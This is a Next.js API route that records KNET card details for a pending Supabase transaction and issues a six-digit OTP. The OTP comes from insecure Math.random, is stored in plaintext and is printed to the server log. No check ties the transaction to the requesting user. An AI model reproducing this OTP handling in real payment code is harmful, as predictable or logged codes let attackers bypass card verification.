import { type NextRequest, NextResponse } from "next/server"
import { createServerClient } from "@/lib/supabase/server"

export async function POST(request: NextRequest) {
  try {
    const { transactionId, cardDetails } = await request.json()

    if (!transactionId || !cardDetails) {
      return NextResponse.json({ success: false, error: "Missing required fields" }, { status: 400 })
    }

    const supabase = await createServerClient()

    const {
      data: { user },
    } = await supabase.auth.getUser()

    const { data: transaction, error: txnError } = await supabase
      .from("transactions")
      .select("*")
      .eq("transaction_id", transactionId)
      .single()

    if (txnError || !transaction) {
      return NextResponse.json({ success: false, error: "Transaction not found" }, { status: 404 })
    }

    if (transaction.status !== "pending") {
      return NextResponse.json({ success: false, error: "Transaction is not in pending status" }, { status: 400 })
    }

    const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
    const otpExpiresAt = new Date(Date.now() + 5 * 60 * 1000) // 5 minutes

    const ipAddress = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "unknown"
    const userAgent = request.headers.get("user-agent") || "unknown"

    const { error: knetError } = await supabase.from("knet_payments").insert({
      transaction_id: transactionId,
      user_id: user?.id || null,
      card_number_last4: cardDetails.cardNumber.slice(-4),
      card_holder_name: cardDetails.cardHolderName || null,
      card_expiry: `${cardDetails.expiryMonth}/${cardDetails.expiryYear}`,
      amount: transaction.amount,
      currency: transaction.currency || "KWD",
      otp_code: otpCode,
      otp_verified: false,
      otp_attempts: 0,
      otp_expires_at: otpExpiresAt.toISOString(),
      status: "otp_sent",
      recharge_data: transaction.recharge_data,
      ip_address: ipAddress,
      user_agent: userAgent,
    })

    if (knetError) {
      console.error(" Failed to create KNET payment record:", knetError)
    }

    const { error: updateError } = await supabase
      .from("transactions")
      .update({
        payment_details: {
          bank: cardDetails.bank,
          cardLastFour: cardDetails.cardNumber.slice(-4),
          expiryMonth: cardDetails.expiryMonth,
          expiryYear: cardDetails.expiryYear,
          submittedAt: new Date().toISOString(),
        },
        status: "otp_required",
      })
      .eq("transaction_id", transactionId)

    if (updateError) {
      console.error(" Failed to update transaction:", updateError)
      return NextResponse.json({ success: false, error: "Failed to process card details" }, { status: 500 })
    }

    console.log(" Card details processed, OTP sent:", otpCode)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error(" Card processing error:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
